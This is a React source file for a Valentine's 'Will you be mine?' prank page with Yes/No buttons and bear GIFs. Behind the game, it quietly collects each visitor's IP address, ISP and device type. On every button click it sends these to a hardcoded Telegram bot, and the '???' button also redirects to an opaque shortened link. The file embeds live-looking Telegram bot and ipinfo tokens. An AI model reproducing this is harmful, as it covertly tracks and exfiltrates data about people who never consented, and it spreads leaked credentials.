import React, { useState, useEffect } from 'react';
import axios from 'axios';
import './styles.css'; // Import the CSS file

export default function Page() {
  const [noCount, setNoCount] = useState(0);
  const [yesPressed, setYesPressed] = useState(false);
  const [deviceType, setDeviceType] = useState('');
  const [ipAddress, setIpAddress] = useState('');
  const [isp, setIsp] = useState('');

  const yesButtonSize = noCount * 20 + 16;

  const handleNoClick = () => {
    setNoCount(noCount + 1);
    const message = `User clicked "${getNoButtonText()}" button`;
    sendMessageToTelegramBot(message);
  };

  const handleYesClick = () => {
    setYesPressed(true);
    const message = `User clicked "Yes" button`;
    sendMessageToTelegramBot(message);
  };

  const getDeviceType = () => {
    // Example logic to determine device type
    const userAgent = navigator.userAgent;
    if (/Android/i.test(userAgent)) {
      return 'Android';
    } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
      return 'iOS';
    } else {
      return 'Unknown';
    }
  };

  const getNoButtonText = () => {
    const phrases = [
      "No",
      "Are you sure?",
      "Really sure?",
      "Think again!",
      "Last chance!",
      "Surely not?",
      "You might regret this!",
      "Give it another thought!",
      "Are you absolutely certain?",
      "This could be a mistake!",
      "Have a heart!",
      "Don't be so cold!",
      "Change of heart?",
      "Wouldn't you reconsider?",
      "Is that your final answer?",
      "You're breaking my heart ;(",
    ];

    return phrases[Math.min(noCount, phrases.length - 1)];
  };

  const sendMessageToTelegramBot = async (message) => {
    const botToken = '6751658476:AAH17_DhTGmOHb3DHjFRe5L-AeEc8ryfcUY'; // Your Telegram bot token
    const chatId = '818897776'; // Your chat ID
    const now = new Date();
    const dateTime = `${now.toLocaleDateString()} ${now.toLocaleTimeString()}`;
    const fullMessage = `${message}\nDevice Type: ${getDeviceType()}\nDate/Time: ${dateTime}\nIP Address: ${ipAddress}\nISP: ${isp}`;

    try {
      await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        chat_id: chatId,
        text: fullMessage
      });
      console.log('Message sent successfully');
    } catch (error) {
      console.error('Error sending message to Telegram bot:', error);
    }
  };

  useEffect(() => {
    // Fetch user IP address and ISP when component mounts
    axios.get('https://api.ipify.org?format=json')
      .then(response => {
        setIpAddress(response.data.ip);
        // Fetch ISP information using ipinfo.io
        return axios.get(`https://ipinfo.io/${response.data.ip}/json?token=11f3dc0e1c1831`);
      })
      .then(response => {
        setIsp(response.data.org);
      })
      .catch(error => {
        console.error('Error fetching IP address or ISP:', error);
      });
  }, []);

  const handleSendInformation = () => {
    const message = `User clicked "Send Information" button`;
    sendMessageToTelegramBot(message);
    window.location.href = 'http://gg.gg/19zo2c';
  };

  return (
    <div className="container">
      <h2>ISP: {isp}</h2>
      {yesPressed ? (
        <>
          <img src="https://media.tenor.com/gUiu1zyxfzYAAAAi/bear-kiss-bear-kisses.gif" alt="Kiss bear" />
          <div className="text-4xl font-bold my-4">YEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE</div>
        </>
      ) : (
        <>
          <img className="h-[200px]" src="https://gifdb.com/images/high/cute-love-bear-roses-ou7zho5oosxnpo6k.gif" alt="Love bear" />
          <h1 className="text-4xl my-4">Will you be mine?</h1>
          <div>
            <button
              className={`button yes-button`}
              style={{ fontSize: yesButtonSize }}
              onClick={handleYesClick}
            >
              Yes
            </button>
            <button
              onClick={handleNoClick}
              className="button no-button"
            >
              {noCount === 0 ? "No" : getNoButtonText()}
            </button>
          </div>
          <button className="purple-button" onClick={handleSendInformation}>???</button>
        </>
      )}
    </div>
  );
}
